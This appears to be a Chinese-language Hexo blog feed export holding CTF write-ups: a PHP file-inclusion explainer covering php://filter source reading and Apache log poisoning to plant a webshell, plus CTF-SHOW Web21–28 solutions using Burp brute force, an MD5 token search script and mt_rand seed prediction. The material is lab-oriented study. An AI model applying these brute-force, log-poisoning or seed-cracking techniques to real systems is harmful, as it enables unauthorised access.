<h2 id="Pwn45（32位无后门函数）"><a href="#Pwn45（32位无后门函数）" class="headerlink" title="Pwn45（32位无后门函数）"></a>Pwn45（32位无后门函数）</h2><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317200343722.png" alt="image-20250317200343722" style="zoom:50%;">

<p>103的长度读了200的数据，也是栈溢出</p>
<p>不过这次没有后门函数了。怎么办呢？</p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2025/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script>]]></content>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/2025/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>文件包含漏洞（FIle Inclusion Vulnerability）是指应用程序中存在的一种安全漏洞，攻击者通过利用漏洞可以在应用程序中执行任意代码。文件包含漏洞通常出现在动态网页中，攻击者通过在URL中注入恶意代码，使应用程序将恶意代码作为正常代码执行。</p>
<p>通俗来讲，就是说开发人员开发程序的时候，每次都需要使用多个文件中的代码，很不方便。为了更方便一点，开发人员将被包含的文件设置成为一个变量，然后这样的话可以非常方便的调用这些文件。但是开发人员并没有限制用户是否也可以调用这些文件，这导致了攻击者会利用这个特征进行一些而已操作。注意这些文件包含本身没有漏洞，而是开发人员的疏忽而导致的漏洞。</p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
<li><h5 id="include-等函数通过动态变量的方式引入包含文件"><a href="#include-等函数通过动态变量的方式引入包含文件" class="headerlink" title="include()等函数通过动态变量的方式引入包含文件"></a>include()等函数通过动态变量的方式引入包含文件</h5></li>
</ol>
<blockquote>
<p>当使用include语句时，被包含的文件中的PHP代码会被执行，而其中的HTML或文本内容会直接输出到页面中</p>
<p>如：eval(“include ‘php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php’;”);</p>
<ol>
<li><p>include会尝试包含处理后的文件流</p>
</li>
<li><p>由于返回的是base64编码的字符串，并非PHP代码</p>
</li>
<li><p>PHP会触发警告并将编码后的字符串作为文本输出</p>
</li>
</ol>
</blockquote>
<ol start="2">
<li><h5 id="用户能够控制该动态变量"><a href="#用户能够控制该动态变量" class="headerlink" title="用户能够控制该动态变量"></a>用户能够控制该动态变量</h5></li>
</ol>
<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><ol>
<li><p>读取敏感文件</p>
</li>
<li><p>利用封装协议读源码</p>
</li>
<li><p>包含图片Getshell</p>
</li>
<li><p>截断包含</p>
</li>
<li><p>包含Apache日志Getshell</p>
</li>
</ol>
<h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>Apache服务器运行后会生成两个日志文件，这两个文件是<code>access.log</code>（访问日志）和<code>error.log</code>（错误日志），apache的日志文件记录下我们的操作，并且写道访问日志文件access.log中</p>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>通过日志文件getshell</p>
<ol>
<li>通过burpsuite发送的请求包产生日志数据</li>
<li>包含日志文件</li>
<li>写入一句话木马getshell</li>
</ol>
<p>使用代理工具抓包，在HTTP请求头中插入一句话木马，日志文件会将HTTP请求头的内容（包括其中的一句话木马）当作网站的访问记录保存，再次访问日志文件的时候，其中的一句话木马就会执行，然后就可以使用蚁剑等工具getshell了</p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SHOW 刷题记录Web2</title>
    <url>/2025/03/18/%E7%88%86%E7%A0%B4/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF SHOW"></a>CTF SHOW</h1><blockquote>
<p>Web 21~28</p>
</blockquote>
<h2 id="Web21"><a href="#Web21" class="headerlink" title="Web21"></a>Web21</h2><p>使用bp进行抓包，在Authorization里发现奇怪的东西</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310223044875.png" alt="image-20250310223044875"></p>
<p>base64解密后获得以下东西</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310223132131.png" alt="image-20250310223132131" style="zoom:50%;">

<p>发现是我们输入的账号和密码。题目已经说了账号是admin，所以我们需要爆破得出密码即可。密码本题目已经给了。</p>
<p>使用自定义迭代器</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310223253005.png" alt="image-20250310223253005" style="zoom:50%;">

<p>格式是：用户名:密码，分为三部分</p>
<p>第一部分是：admin</p>
<p>第二部分是：“ : ”</p>
<p>第三部分就是密码了。这里密码一个个替换成字典中的密码（记得用题目给的附件，不然时间太久了），然后看是否返回一个有效页面（200OK）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310223520745.png" alt="image-20250310223520745" style="zoom:33%;"><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310223536652.png" alt="image-20250310223536652" style="zoom:33%;"><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310223920172.png" alt="image-20250310223920172" style="zoom:33%;"></p>
<p>接着，需要对发送的内容进行base64加密</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310224026389.png" alt="image-20250310224026389" style="zoom: 33%;"><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310224033662.png" alt="image-20250310224033662" style="zoom:33%;"></p>
<p>最后记得把payload encoding关掉，避免影响base64密文</p>
<p>开始攻击</p>
<p>得到一个成功的</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310224226022.png" alt="image-20250310224226022"></p>
<p>我们查看返回的页面即可获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Web22"><a href="#Web22" class="headerlink" title="Web22"></a>Web22</h2><p>域名爆破</p>
<h2 id="Web23"><a href="#Web23" class="headerlink" title="Web23"></a>Web23</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="前置基础知识"><a href="#前置基础知识" class="headerlink" title="前置基础知识"></a>前置基础知识</h3><h5 id="substr函数"><a href="#substr函数" class="headerlink" title="substr函数"></a>substr函数</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>(<span class="keyword">string</span>, start, length)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>string：必需。规定要返回其中一部分的字符串</p>
</li>
<li><p>start：必需。规定在字符串的何处开始</p>
<ul>
<li>正数：在字符串的指定位置开始</li>
<li>负数：在从字符串结尾的指定位置开始</li>
<li>0：在字符串的第一个字符处开始</li>
</ul>
</li>
<li><p>length：可选。规定要返回的字符串长度。默认是直到字符串的结尾</p>
<ul>
<li>正数：从start参数所在的位置返回</li>
<li>负数：从字符串末端返回</li>
</ul>
</li>
</ul>
<h5 id="isset函数"><a href="#isset函数" class="headerlink" title="isset函数"></a>isset函数</h5><p>用于检测变量是否已设置并且非 NULL</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="keyword">isset</span>(<span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">mixed</span> $...] )</span><br></pre></td></tr></table></figure>

<ul>
<li>$var：要检测的变量</li>
</ul>
<p>如果一次传入多个参数，那么 isset() 只有在全部参数都被设置时返回 TRUE，计算过程从左至右，中途遇到没有设置的变量时就会立即停止。</p>
<h5 id="intval函数"><a href="#intval函数" class="headerlink" title="intval函数"></a>intval函数</h5><p>用于获取变量的整数值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">intval</span>( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>] )</span><br></pre></td></tr></table></figure>

<ul>
<li>$var：要转换成integer的数量值</li>
<li>$base：转化所使用的进制</li>
</ul>
<p>如果base是0，则通过检测var的格式来决定使用的进制：</p>
<ul>
<li>如果字符串包含了“0x”，使用16进制</li>
<li>如果字符串以“0”开头，使用八进制</li>
<li>否则使用十进制</li>
</ul>
<h5 id="md5加密"><a href="#md5加密" class="headerlink" title="md5加密"></a>md5加密</h5><p>信息摘要算法，用于认证。将任意长信息生成128比特的（0，1）串。</p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>抓包得到以下内容</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250311132227471.png" alt="image-20250311132227471" style="zoom:50%;">

<p>根据题目分析，需要手动设置token。其中:</p>
<ol>
<li><p>token通过md5加密</p>
</li>
<li><p>token[1]&#x3D;[14]&#x3D;[17]</p>
</li>
<li><p>(token[1]+[14]+[17]) &#x2F; token[1] &#x3D; token[31]</p>
</li>
</ol>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">100000</span>):</span><br><span class="line">    token = <span class="built_in">str</span>(i)</span><br><span class="line">    token_md5 = hashlib.md5(token.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> token_md5[<span class="number">1</span>].isdigit() <span class="keyword">and</span> token_md5[<span class="number">14</span>] <span class="keyword">and</span> token_md5[<span class="number">17</span>].isdigit() <span class="keyword">and</span> token_md5[<span class="number">31</span>].isdigit():</span><br><span class="line">        <span class="keyword">if</span> token_md5[<span class="number">1</span>] == token_md5[<span class="number">14</span>] == token_md5[<span class="number">17</span>] <span class="keyword">and</span> <span class="built_in">int</span>(token_md5[<span class="number">1</span>]) !=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">int</span>(token_md5[<span class="number">1</span>]) + <span class="built_in">int</span>(token_md5[<span class="number">14</span>]) + <span class="built_in">int</span>(token_md5[<span class="number">17</span>])) / <span class="built_in">int</span>(token_md5[<span class="number">1</span>]) == <span class="built_in">int</span>(token_md5[<span class="number">31</span>]):</span><br><span class="line">                <span class="built_in">print</span>(token)</span><br><span class="line">                <span class="built_in">print</span>(token_md5)</span><br></pre></td></tr></table></figure>

<p>将得到的符合要求的token加到url后即可，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://f3489a03-f66f-418a-996e-8ad7d1ec9ac6.challenge.ctf.show/?token=422</span><br></pre></td></tr></table></figure>

<h3 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h3><p>使用burp爆破得到token</p>
<h2 id="Web24"><a href="#Web24" class="headerlink" title="Web24"></a>Web24</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> Linux version <span class="number">5.4</span>.<span class="number">0</span>-<span class="number">163</span>-<span class="title function_ invoke__">generic</span> (buildd@lcy02-amd64-<span class="number">067</span>) (gcc version <span class="number">9.4</span>.<span class="number">0</span> (Ubuntu <span class="number">9.4</span>.<span class="number">0</span>-<span class="number">1</span>ubuntu1~<span class="number">20.04</span>.<span class="number">2</span>)) <span class="comment">#180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023</span></span><br></pre></td></tr></table></figure>

<h3 id="前置基础知识-1"><a href="#前置基础知识-1" class="headerlink" title="前置基础知识"></a>前置基础知识</h3><h5 id="mt-srand函数"><a href="#mt-srand函数" class="headerlink" title="mt_srand函数"></a>mt_srand函数</h5><p>函数播种MErsenne Twister随机数生成器</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_srand</span>(seed);</span><br></pre></td></tr></table></figure>

<p>seed: 可选。规定播种值</p>
<h5 id="种子确定的随机数生成器生成序列相同"><a href="#种子确定的随机数生成器生成序列相同" class="headerlink" title="种子确定的随机数生成器生成序列相同"></a>种子确定的随机数生成器生成序列相同</h5><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目给了种子：372619038</p>
<p>同时发现了下方有时间戳等等信息</p>
<p>是以哦那个随机数生成器，要求r和指定种子生成的随机数相同才能给flag</p>
<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果得到：</p>
<p>标准输出：1155388967</p>
<p>故只需要在url后加上<code>r=1155388967</code>即可</p>
<h2 id="Web25"><a href="#Web25" class="headerlink" title="Web25"></a>Web25</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());   <span class="comment">#第一个随机数</span></span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;	<span class="comment">#第二个和第三个随机数</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Linux version <span class="number">5.4</span>.<span class="number">0</span>-<span class="number">163</span>-<span class="title function_ invoke__">generic</span> (buildd@lcy02-amd64-<span class="number">067</span>) (gcc version <span class="number">9.4</span>.<span class="number">0</span> (Ubuntu <span class="number">9.4</span>.<span class="number">0</span>-<span class="number">1</span>ubuntu1~<span class="number">20.04</span>.<span class="number">2</span>)) <span class="comment">#180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023</span></span><br></pre></td></tr></table></figure>

<h3 id="前置基础知识-2"><a href="#前置基础知识-2" class="headerlink" title="前置基础知识"></a>前置基础知识</h3><h5 id="hexdec函数"><a href="#hexdec函数" class="headerlink" title="hexdec函数"></a>hexdec函数</h5><p>把十六进制转化为十进制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">hexdec</span>(hex_string)</span><br></pre></td></tr></table></figure>

<p>hex_string: 必需。规定要转换的十六进制字符串</p>
<h5 id="php-mt-seed工具"><a href="#php-mt-seed工具" class="headerlink" title="php_mt_seed工具"></a>php_mt_seed工具</h5><p>随机数的产生基于种子。但是可以通过产生的随机数来猜测种子，进而猜测后续的随机数</p>
<p>需要指明的是，不同版本的php，同一个种子产生的随机数有可能不同</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./php_mt_seed [number]</span><br></pre></td></tr></table></figure>

<p>后续会得到不同版本php下对应可能的种子</p>
<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>需要GET请求发送r的值</p>
<ol>
<li>设置种子。种子为<code>hexdec(substr(md5($flag), 0,8))</code></li>
</ol>
<ul>
<li>将flag进行md5加密（得到长度为32的16进制串）</li>
<li>截取flag_md5的0~8子串</li>
<li>将子串转化为十进制数</li>
</ul>
<ol start="2">
<li><p>得到rand。rand为：</p>
<p><code>输入的r转化为int - 生成的第一个随机数</code></p>
<p>要求结果为0，即输入数等于生成的随机数</p>
</li>
<li><p>需要设置cookie，cookie为生成的第二个随机数 + 第三个随机数</p>
</li>
</ol>
<h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h3><p>首先通过分析，得出输入0可以得到生成的第一个随机数的相反数</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250311154351542.png" alt="image-20250311154351542" style="zoom:67%;">

<p>也就是说，生成的第一个随机数是<code>1059248734</code></p>
<p>这个时候需要使用到<code>php_mt_seed</code>工具进行爆破</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250311201058074.png" alt="image-20250311201058074" style="zoom: 67%;">

<p>最后通过尝试，得出php的版本是7.1.0+</p>
<p>后续省略了（因为<del>赶时间</del>懒不做了）</p>
<h2 id="Web26"><a href="#Web26" class="headerlink" title="Web26"></a>Web26</h2><p>我就抓了个点击同意安装后的包后，重发，就找到flag了？？？</p>
<p>还真是这样做的，不知道和爆破有什么关系</p>
<h2 id="Web27"><a href="#Web27" class="headerlink" title="Web27"></a>Web27</h2><p>这个题我感觉是很有感觉的</p>
<p>打开是一个教务管理系统的登录页面</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250311202238331.png" alt="image-20250311202238331" style="zoom:50%;">

<p>注意到下方还有两个链接</p>
<p>一个打开后下载了名单</p>
<img src="C:/Users/czh/AppData/Roaming/Typora/typora-user-images/image-20250311202420630.png" alt="image-20250311202420630" style="zoom:50%;">

<p>另一个打开后是录取查询</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250311202449498.png" alt="image-20250311202449498"></p>
<p>由于名单中给出了姓名和部分身份证号码，所以我们可以进行爆破</p>
<p>我选择爆一下这个党员，因为主播觉得要严查一下这个党员</p>
<p>首先抓包</p>
<img src="C:/Users/czh/AppData/Roaming/Typora/typora-user-images/image-20250311202851294.png" alt="image-20250311202851294" style="zoom:50%;">

<p>密码并没有进行加密，所以直接对生日这一块进行爆破就可以</p>
<p>而<strong>如何缩短爆破的条数</strong>是我们需要考虑的</p>
<p>这里需要设置<code>payload</code>格式为<code>date</code>，且<code>date</code>自定义格式为<code>yyyyMMdd</code></p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250311204825109.png" alt="image-20250311204825109" style="zoom:50%;">

<p>得到有一个回复特别长的</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250311210447707.png" alt="image-20250311210447707" style="zoom:50%;">

<p>一般这种就是成功的了</p>
<p>得到以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;0&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;\u606d\u559c\u60a8\uff0c\u60a8\u5df2\u88ab\u6211\u6821\u5f55\u53d6\uff0c\u4f60\u7684\u5b66\u53f7\u4e3a10167653 \u521d\u59cb\u5bc6\u7801\u4e3a\u8eab\u4efd\u8bc1\u53f7\u7801&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>这中文使用给的Unicode编码，解密一下就好了</p>
<p>得到以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">恭喜您，您已被我校录取，你的学号为10167653 初始密码为身份证号码</span><br></pre></td></tr></table></figure>

<p>大功告成了</p>
<p>身份证号码即为：360730199110167653</p>
<h2 id="Web28"><a href="#Web28" class="headerlink" title="Web28"></a>Web28</h2><p>乍看有点像信息搜索</p>
<p>所以我就使用信息搜索三件套试试看</p>
<p>都没有成果</p>
<p>接着看这个网址有点蹊跷</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://26e2702c-3e14-4f64-a9f7-631273587e0b.challenge.ctf.show/0/1/2.txt</span><br></pre></td></tr></table></figure>

<p>试试直接访问flag.txt没有成功</p>
<p>访问1&#x2F;被拦在外面了</p>
<p>乍一看能入手的地方只有这个url了，完全没有思路啊</p>
<h3 id="前置基础知识-3"><a href="#前置基础知识-3" class="headerlink" title="前置基础知识"></a>前置基础知识</h3><h5 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h5><p>待编写</p>
<h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>用bp抓包后，发现原url是进行了302跳转才进入了原url &#x2F;0&#x2F;1&#x2F;2.txt</p>
<p>如果直接访问 &#x2F;0&#x2F;1，会进行302跳转，然后跳转就会进入死循环，最后打不开</p>
<p>根据题目提示需要爆破，那么爆破点只能是原url后面这两个目录了</p>
<p>如何设置payload这里就不详细解释了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250311213016197.png" alt="image-20250311213016197"></p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/12/08/node_modules/hexo-asset-img/README/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p align="center">
